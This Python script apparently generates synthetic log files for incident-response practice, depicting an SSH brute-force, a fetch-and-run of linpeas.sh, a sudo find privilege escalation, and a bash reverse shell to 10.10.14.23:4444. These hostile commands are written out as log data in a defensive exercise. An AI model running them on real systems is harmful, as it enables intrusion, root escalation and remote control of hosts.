import os

os.makedirs("sample_logs", exist_ok=True)

auth_log_content = """Oct 17 14:01:10 prod-web-01 sshd[1021]: Accepted publickey for admin from 192.168.1.50 port 51234 ssh2
Oct 17 14:05:01 prod-web-01 CRON[1099]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 17 14:12:04 prod-web-01 sshd[2101]: Failed password for invalid user guest from 10.10.14.23 port 44101 ssh2
Oct 17 14:12:06 prod-web-01 sshd[2103]: Failed password for root from 10.10.14.23 port 44102 ssh2
Oct 17 14:12:08 prod-web-01 sshd[2105]: Failed password for svc_backup from 10.10.14.23 port 44108 ssh2
Oct 17 14:12:11 prod-web-01 sshd[2109]: Accepted password for svc_backup from 10.10.14.23 port 44115 ssh2
Oct 17 14:12:12 prod-web-01 sshd[2109]: pam_unix(sshd:session): session opened for user svc_backup by (uid=0)
Oct 17 14:13:45 prod-web-01 sudo: svc_backup : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh -p \; -quit
"""

sysmon_json_content = """[
  {
    "Timestamp": "2026-10-17T14:10:00Z",
    "EventID": 1,
    "User": "root",
    "Image": "/usr/sbin/cron",
    "CommandLine": "/usr/sbin/cron -f"
  },
  {
    "Timestamp": "2026-10-17T14:12:50Z",
    "EventID": 1,
    "User": "svc_backup",
    "ParentImage": "/bin/bash",
    "Image": "/usr/bin/curl",
    "CommandLine": "curl -s http://10.10.14.23:8000/linpeas.sh | bash"
  },
  {
    "Timestamp": "2026-10-17T14:13:45Z",
    "EventID": 1,
    "User": "root",
    "ParentImage": "/usr/bin/sudo",
    "Image": "/usr/bin/find",
    "CommandLine": "/usr/bin/find . -exec /bin/sh -p ; -quit"
  },
  {
    "Timestamp": "2026-10-17T14:14:20Z",
    "EventID": 1,
    "User": "root",
    "ParentImage": "/bin/sh",
    "Image": "/bin/bash",
    "CommandLine": "bash -c 'bash -i >& /dev/tcp/10.10.14.23/4444 0>&1'"
  }
]"""

network_flows_content = """Timestamp,Src_IP,Src_Port,Dst_IP,Dst_Port,Protocol,Bytes,Flags,Summary
2026-10-17T14:01:10Z,192.168.1.50,51234,192.168.1.10,22,TCP,4200,SYN-ACK,Normal Admin SSH
2026-10-17T14:12:04Z,10.10.14.23,44101,192.168.1.10,22,TCP,18400,SYN,Rapid SSH Connections (15 attempts)
2026-10-17T14:12:50Z,192.168.1.10,58112,10.10.14.23,8000,HTTP,315000,GET,GET /linpeas.sh HTTP/1.1
2026-10-17T14:14:20Z,192.168.1.10,39881,10.10.14.23,4444,TCP,89400,PSH-ACK,Long-lived outbound session to non-standard port
"""

with open("sample_logs/auth.log", "w") as f:
    f.write(auth_log_content)
with open("sample_logs/sysmon.json", "w") as f:
    f.write(sysmon_json_content)
with open("sample_logs/network_flows.csv", "w") as f:
    f.write(network_flows_content)

print("[+] Sample logs generated inside ./sample_logs/")